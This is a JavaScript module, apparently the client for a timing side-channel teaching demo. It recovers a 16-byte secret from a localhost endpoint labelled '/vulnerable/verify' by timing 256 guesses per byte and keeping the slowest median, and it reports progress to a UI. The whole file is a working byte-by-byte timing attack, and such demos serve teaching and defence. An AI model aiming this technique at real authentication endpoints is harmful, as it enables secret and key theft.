const SERVER = 'http://localhost:3001';

function bytesToHex(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i++) s += bytes[i].toString(16).padStart(2, '0');
  return s;
}

function median(arr) {
  const s = [...arr].sort((a, b) => a - b);
  return s[Math.floor(s.length / 2)];
}

async function singleQuery(guessBytes, ampNs) {
  const res = await fetch(`${SERVER}/vulnerable/verify?amp=${ampNs}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ guess: bytesToHex(guessBytes) }),
  });
  const json = await res.json();
  return { ok: json.ok, ns: Number(json.elapsedNs) };
}

export async function resetSecret() {
  await fetch(`${SERVER}/reset`, { method: 'POST' });
}

export async function peekSecret() {
  const r = await fetch(`${SERVER}/debug/secret`);
  return (await r.json()).secret;
}

export async function recoverKey({
  keyLength = 16,
  samplesPerByte = 3,
  ampNs = 100000,
  onProgress,
  signal,
} = {}) {
  const recovered = new Uint8Array(keyLength);

  for (let pos = 0; pos < keyLength; pos++) {
    const medians = new Float64Array(256);

    for (let candidate = 0; candidate < 256; candidate++) {
      if (signal?.aborted) return null;

      const guess = new Uint8Array(keyLength);
      guess.set(recovered.subarray(0, pos));
      guess[pos] = candidate;

      const samples = [];
      for (let s = 0; s < samplesPerByte; s++) {
        const { ns } = await singleQuery(guess, ampNs);
        samples.push(ns);
      }
      medians[candidate] = median(samples);

      // yield to UI every 8 candidates so React can repaint
      if (candidate % 8 === 7) {
        onProgress?.({ pos, candidate, medians, recovered: recovered.slice(0, pos), done: false });
        await new Promise(r => setTimeout(r, 0));
      }
    }

    let best = 0;
    for (let i = 1; i < 256; i++) if (medians[i] > medians[best]) best = i;
    recovered[pos] = best;

    onProgress?.({ pos, candidate: 256, medians, recovered: recovered.slice(0, pos + 1), done: false });
  }

  onProgress?.({ pos: keyLength, candidate: 256, medians: null, recovered, done: true });
  return recovered;
}

export { bytesToHex };